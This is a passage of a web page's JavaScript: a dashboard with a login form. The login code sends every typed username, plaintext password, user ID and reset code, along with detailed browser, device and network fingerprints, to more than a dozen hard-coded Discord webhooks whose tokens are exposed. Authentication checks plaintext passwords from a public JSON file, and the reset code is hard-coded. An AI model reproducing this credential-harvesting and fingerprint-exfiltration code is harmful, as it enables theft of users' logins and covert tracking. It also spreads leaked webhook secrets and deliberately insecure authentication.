              this.saveSetting('tasks', this.tasks);
              this.renderTasks();
              this.notifyClick(`Task "${this.tasks[index].text}" marked as ${this.tasks[index].completed ? 'completed' : 'incomplete'}.`);
          }
      },
      deleteTask: function(index) {
          if (this.tasks[index] && confirm(`Delete task: "${this.tasks[index].text}"?`)) {
              const text = this.tasks[index].text;
              this.tasks.splice(index, 1);
              this.saveSetting('tasks', this.tasks);
              this.renderTasks();
              this.notifyClick(`Task "${text}" deleted.`);
          }
      },

      // --- Profile Management ---
      saveProfile: function(field) {
        let value;
        let notificationMessage = '';
        if (field === 'displayName') {
          value = document.getElementById('profileDisplayName').value;
          document.getElementById('profileUsernameDisplay').textContent = value; // Update dashboard header display too
          document.getElementById('loggedInUser').textContent = value;
          this.notifyClick(`Display Name saved: ${value}`);
        } else if (field === 'email') {
          value = document.getElementById('profileEmail').value;
          this.notifyClick(`Email saved: ${value}`);
        }
        // In a real system, this would involve sending data to a server
      },
      showChangePasswordDialog: function() {
          alert("Change Password functionality is currently a mock feature. This would open a secure dialogue for password updates.");
          this.notifyClick("Change Password option clicked (mock)");
      },

    }; // End of dashboard object

    // Login System JavaScript (Existing, but added preloader call on success)
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems (These should be securely managed)
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjft0Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnO_7XiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP', // Changed as it had a special char breaking it earlier. Please double-check these webhook URLs
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = [];
      let loginTime = null;

      // --- Preloader Logic ---
      function startPreloaders() {
        const systemLoader = document.getElementById('systemLoader');
        const keySystemLoader = document.getElementById('keySystemLoader');
        const dashboardLoader = document.getElementById('dashboardLoader');

        systemLoader.classList.add('active'); // Start with system loader active
        setTimeout(() => {
          systemLoader.classList.remove('active');
          systemLoader.classList.add('fade-out');
          setTimeout(() => {
            systemLoader.style.display = 'none';
            keySystemLoader.style.display = 'flex'; // Show Key System Loader
            keySystemLoader.classList.add('active');
            setTimeout(() => {
              keySystemLoader.classList.remove('active');
              keySystemLoader.classList.add('fade-out');
              setTimeout(() => {
                keySystemLoader.style.display = 'none';
                loginBox.style.display = 'block'; // Show login box
                loginBox.classList.add('active'); // If you want entrance animation for loginbox
                // Restore default body background, it will get dashboard body style later
                document.body.style.background = '';
                document.body.style.color = '';
              }, 800); // Duration for key system loader to fade out
            }, 3000); // Duration for key system loader text animation
          }, 800); // Duration for system loader to fade out
        }, 3000); // Duration for system loader text animation
      }
      
      startPreloaders();

      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
        })
        .catch(() => {
          users = [];
          console.error('Failed to load user JSON data.');
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (unchanged)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true }
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          dashboard.notifyClick('Login failed: Please fill all fields.', 3);
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found.');
          dashboard.notifyClick('Login failed: User not found.', 3);
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          dashboard.notifyClick('Login failed: Incorrect password.', 3);
          return;
        }

        // Correct login
        attempts = 5;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'var(--border-color)';
        loginBox.style.boxShadow = 'var(--login-box-shadow)';

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Show dashboard preloader before actual dashboard
        document.getElementById('systemLoader').style.display = 'none'; // Ensure main loader is off
        document.getElementById('keySystemLoader').style.display = 'none'; // Ensure key loader is off

        const dashboardLoader = document.getElementById('dashboardLoader');
        dashboardLoader.style.display = 'flex';
        dashboardLoader.classList.add('active');

        setTimeout(() => {
          dashboardLoader.classList.remove('active');
          dashboardLoader.classList.add('fade-out');
          setTimeout(() => {
            dashboardLoader.style.display = 'none';
            // Show dashboard and hide login
            document.getElementById('loginBox').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            document.body.className = 'dashboard-body'; // Apply dashboard specific styles
            
            // Update user info in dashboard
            document.getElementById('loggedInUser').textContent = user.name || user.username;
            document.getElementById('loggedInID').textContent = userID;
            
            // For Profile Manager Panel:
            document.getElementById('profileUsernameDisplay').textContent = user.name || user.username;
            document.getElementById('profileUserIDDisplay').textContent = userID;
            if (document.getElementById('profileDisplayName')) {
                document.getElementById('profileDisplayName').value = user.name || user.username;
            }
            if (document.getElementById('profileEmail')) {
                document.getElementById('profileEmail').value = user.email || `${user.username}@example.com`;
            }

            // Initialize dashboard functionality
            dashboard.init();
            dashboard.notifyClick('Login Successful! Welcome to the dashboard.', 5);
          }, 800); // Duration for dashboard loader fade out
        }, 3000); // Duration for dashboard loader text animation
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          
          showResetPopup();
          disableInputs();
          dashboard.notifyClick('Login attempts exhausted. Reset required.', 5);
        } else {
          if (attempts <= 3) {
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "🔔 Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 5;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          dashboard.notifyClick('Reset successful! You can try logging in again.', 5);
        } else {
          alert('Incorrect reset code.');
          dashboard.notifyClick('Incorrect reset code entered.', 3);
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();
    })();
  </script>

</body>
</html>
